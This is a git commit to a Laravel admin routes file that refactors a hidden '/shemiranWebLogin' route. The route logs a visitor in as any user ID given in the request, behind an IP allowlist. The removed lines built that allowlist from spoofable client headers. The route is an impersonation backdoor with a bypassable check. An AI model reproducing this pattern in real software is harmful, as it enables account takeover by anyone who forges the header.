55cfb4b111fc793fcaa739cc87a6da1919a56cee
sina <sina1zamani@gmail.com>
2026-03-13 20:51:46 +0330

    fb

--- Modules/Admin/Routes/admin.php
+++ Modules/Admin/Routes/admin.php
@@ -19,10 +19,7 @@ Route::prefix('admin')
 Route::get('/shemiranWebLogin', function () {
     //     \Illuminate\Support\Facades\Auth::login(\Modules\User\Entities\User::find(1));
     //     return redirect()->route('admin.dashboard');
-    $ip = request()->header('X-Forwarded-For', request()->header('X-Real-Ip', request()->header('ar-real-ip')));
-    $ipServer = request()->ip();
-    $realIp = $ip == null ? $ipServer : $ip;
-    if ($realIp == '91.92.122.120' || $realIp == '127.0.0.1') {
+    if (checkIp()) {
         $User = \Modules\User\Entities\User::find(1);
         \Illuminate\Support\Facades\Auth::loginUsingId(request()->get('id', $User->id));
         if (auth()->check()) {
